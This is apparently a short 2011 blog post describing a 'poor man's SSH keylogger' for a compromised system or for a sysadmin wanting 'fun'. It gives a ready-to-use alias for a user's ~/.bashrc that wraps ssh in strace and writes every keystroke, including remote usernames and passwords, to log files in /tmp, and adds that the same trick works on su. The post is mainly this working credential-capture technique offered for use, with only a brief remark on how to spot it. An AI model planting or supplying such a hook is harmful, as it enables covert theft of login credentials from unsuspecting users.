---
title: Poor man's SSH keylogger
date: '2011-02-03'
summary: "If you have compromised a system (while doing penetration testing, obviously), or if you are just a BOFH that wishes to have a little fun, you can do something as easy as this..."
categories:
---

If you have compromised a system (while doing penetration testing, obviously), or if you are just a BOFH that wishes to have a little fun, you can do something as easy as this:

Edit the users ~/.bashrc and insert the following alias:

<pre>
ssh='strace   -o   /tmp/sshpwd-`date    '+%d%h%m%s'`.log  \
 -e read,write,connect  -s2048 ssh' 
</pre>

Now, every time a user uses the ssh command, he will be using this alias, and all his keystrokes (including the remote system's username/password), will be logged to /tmp.

<img src="http://media.tumblr.com/tumblr_lg1sdtJp921qevk7j.png" style="float:left;margin:0px 30px 0px 0px;" />

As I said, this is nothing fancy, and a quick look at the env, at the .bashrc or even at /tmp is enough to spot this. However, for a quick simple solution, it is more than enough.

Update: as one of the readers pointed out, this also works with su, using the exact same trick.
